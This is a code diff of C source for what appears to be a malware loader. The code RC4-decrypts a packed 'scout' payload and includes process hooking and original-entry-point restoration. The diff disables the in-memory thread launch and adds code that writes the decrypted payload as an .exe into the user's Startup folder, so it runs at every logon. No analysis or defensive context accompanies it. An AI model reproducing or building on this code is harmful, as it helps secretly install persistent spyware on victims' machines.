@@ -190,9 +190,9 @@ endmagicloop:
 	//
 	
 	// *** Hook ExitProcess the lame way
-
+/*
 	ULONG uOldProtect;
-
+	
 	MEMORY_BASIC_INFORMATION mbi;
 	ULONG uHookAddress = (ULONG)((PBYTE)header + header->functions.exitProcessHook.offset);
 	LPVOID pBaseAddress = pData->GetModuleHandleA(NULL);
@@ -217,6 +217,7 @@ endmagicloop:
 	pfn_VirtualProtect(&header->dllPath, 4096, PAGE_READWRITE, &uOldProtect);
 	// exit hook
 	pfn_VirtualProtect(((PBYTE)header + header->functions.exitProcessHook.offset), header->functions.load.size, PAGE_EXECUTE_READ, &uOldProtect);
+	*/
 
 	if (header->isScout)
 	{
@@ -227,18 +228,55 @@ endmagicloop:
 		ARCFOUR pfn_rc4skip = (ARCFOUR) (((char*)header) + header->functions.rc4.offset);
 		pfn_rc4skip((PBYTE)header->rc4key, 64, 0, pPackedScoutBuffer, header->files.core.size, pData);
 
-		PBYTE pScoutBuffer = (PBYTE) pData->VirtualAlloc(NULL, header->files.core.original_size, MEM_COMMIT, PAGE_READWRITE);
-		if (aP_depack(pPackedScoutBuffer, pScoutBuffer) != header->files.core.original_size)
-			goto OEP_RESTORE;
-		pData->VirtualFree(pPackedScoutBuffer, 0, MEM_RELEASE);
+		//PBYTE pScoutBuffer = (PBYTE) pData->VirtualAlloc(NULL, header->files.core.original_size, MEM_COMMIT, PAGE_READWRITE);
+		//if (aP_depack(pPackedScoutBuffer, pScoutBuffer) != header->files.core.original_size)
+		//	goto OEP_RESTORE;
+		//pData->VirtualFree(pPackedScoutBuffer, 0, MEM_RELEASE);
 
 		// ** save buffer & size
-		pData->pScoutBuffer = pScoutBuffer;
+		pData->pScoutBuffer = pPackedScoutBuffer;
 		pData->pScoutSize = header->files.core.original_size;
 
-		pfn_VirtualProtect(((PBYTE)header + header->functions.load.offset), header->functions.load.size, PAGE_EXECUTE_READ, &uOldProtect);
+		//pfn_VirtualProtect(((PBYTE)header + header->functions.load.offset), header->functions.load.size, PAGE_EXECUTE_READ, &uOldProtect);
 		// *** start the scout
-		HANDLE hThread = pData->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ((PBYTE)header + header->functions.load.offset), pData, 0, NULL);
+		//HANDLE hThread = pData->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ((PBYTE)header + header->functions.load.offset), pData, 0, NULL);
+		LPWSTR strTempPath = (LPWSTR) pData->VirtualAlloc(NULL, 32768*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
+		LPWSTR strScoutPath = (LPWSTR) pData->VirtualAlloc(NULL, 32768*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
+		_MEMSET_(strScoutPath, 0x0, 32768*sizeof(WCHAR));
+
+		pData->SHGetSpecialFolderPathW(NULL, strTempPath, CSIDL_STARTUP, FALSE);
+		pData->GetShortPathNameW(strTempPath, strScoutPath, 32767);
+		pData->VirtualFree(strTempPath, 0, MEM_RELEASE);
+
+		strTempPath = strScoutPath;
+
+		while (*strTempPath != 0x0)
+			strTempPath++;
+		*strTempPath = L'\\';
+		strTempPath++;
+
+		DWORD x, y;
+		x = y = 0;
+		while (header->eliteExports[x] != 0)
+		{
+			((PCHAR)strTempPath)[y] = header->eliteExports[x];
+			y++;
+			((PCHAR)strTempPath)[y] = 0x0;
+
+			x++;
+			y++;
+		}
+		strTempPath[x] = L'.';
+		strTempPath[x+1] = L'e';
+		strTempPath[x+2] = L'x';
+		strTempPath[x+3] = L'e';
+		
+		HANDLE hScoutFile = pData->CreateFileW(strScoutPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hScoutFile != INVALID_HANDLE_VALUE)
+		{
+			pData->WriteFile(hScoutFile, pData->pScoutBuffer, pData->pScoutSize, &x, NULL);
+			pData->CloseHandle(hScoutFile);
+		}
 	}
 	else
 	{
@@ -711,6 +749,7 @@ BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD dataSize, DWORD orig
 
 	RC4_SKIP pfn_rc4skip = (RC4_SKIP) (((PCHAR)pData->header) + pData->header->functions.rc4.offset);
 	pfn_rc4skip((PBYTE)pData->header->rc4key, RC4KEYLEN, 0, (PBYTE)pPackedBuffer, dataSize, pData);
+	
 	dwUnpackedSize = aP_depack(pPackedBuffer, pUnpackedBuffer);
 
 	pData->VirtualFree(pPackedBuffer, 0, MEM_RELEASE);
